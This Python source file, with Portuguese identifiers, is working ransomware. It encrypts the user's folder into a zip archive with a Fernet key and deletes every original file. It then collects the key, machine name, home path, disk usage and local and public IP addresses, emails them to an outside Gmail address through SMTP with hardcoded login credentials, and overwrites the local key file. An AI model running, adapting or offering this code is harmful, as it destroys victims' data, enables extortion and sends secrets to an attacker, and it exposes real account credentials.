import os
import shutil
import smtplib
import socket
import urllib.request
from os.path import exists
from pathlib import Path
from time import sleep

import psutil
from cryptography.fernet import Fernet
from requests import get

from encrypt import zip_folderPyzipper
from variavel import userPath

criptografadoNesteMomento = False
key = ''.encode()
while True:
    if exists(f'{userPath}/bloqueado.zip.FuckYourFiles'):
        with open('config/filekey.key', 'r') as filekey:
            key = filekey.read()
        break
    else:
        key = Fernet.generate_key()
        with open('config/filekey.key', 'wb') as filekey:
            filekey.write(key)
            sleep(1)
    zip_folderPyzipper(userPath, '/', key)

    for filename in os.listdir(userPath):
        filepath = os.path.join(userPath, filename)
        try:
            shutil.rmtree(filepath)
        except OSError:
            os.remove(filepath)
    shutil.move('bloqueado.zip.FuckYourFiles', userPath)
    criptografadoNesteMomento = True

print('parece que os arquivos já foram encriptados')

dados = []


def obtemInformacao():

    dados.append('CHAVE --->\n')
    dados.append(key)
    dados.append('\n\n')

    machineName = '\nnome da maquina:', os.getenv('COMPUTERNAME')
    dados.append(machineName)

    dados.append('\nDiretorio do usuario: ')
    home = str(Path.home())
    dados.append(home)

    hdd = psutil.disk_usage('/')
    memoriaTotal = '\n\nHD:\nTOTAL:', round(hdd.total / (2**30), 3)
    dados.append(memoriaTotal)
    memoriaUsada = ", USED: ", round(hdd.used / (2**30), 3)
    dados.append(memoriaUsada)
    memoriaLivre = ", FREE: ", round(hdd.free / (2**30), 3)
    dados.append(memoriaLivre)

    s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    s.connect(("8.8.8.8", 80))
    ipLocal = s.getsockname()[0]
    dados.append('\n IP Local:')
    dados.append(ipLocal)
    s.close()

    dados.append('\n IP Publico:')
    ip = get('https://api.ipify.org').text
    dados.append(ip)

    ipExterno = f'public IP: {ip}'
    dados.append(ipExterno)


def connect(host='https://mail.google.com/'):
    try:
        urllib.request.urlopen(host)  # Python 3.x
        return True

    except:
        return False


# test
print("connected" if connect() else "erro de conexão!")


def enviaInformacao():

    result = ''.join(''.join(map(str, tup)) for tup in dados)
    print(result)
    server = smtplib.SMTP_SSL('smtp.gmail.com', 465)
    server.login("jeffersonssantos93@gmail.com", "muzwoulszlsmoqjx")
    server.sendmail('jeffersonssantos93@gmail.com',
                    'jeffersonssantos92@gmail.com', result)
    server.quit()


while True:
    confirmation = 'sim'
    informationSent = ''
    try:
        with open('config/informationSent.xml', 'r') as informationSentFile:
            informationSent = informationSentFile.read()
    except:
        print('as informações ainda não formam enviadas')
    if confirmation in informationSent and criptografadoNesteMomento == False:
        print('a informação já foi enviada')
        break

    elif connect():
        obtemInformacao()
        enviaInformacao()
        with open('config/informationSent.xml', 'w') as informationSentFile:
            informationSent = informationSentFile.write('sim')

        with open('config/filekey.key', 'w') as filekey:
            key = filekey.write(
                'a chave evaporou!')
        break
    else:
        print('falha na conexão!\nTentando novamente...')
        sleep(1)
        os.system('cls')
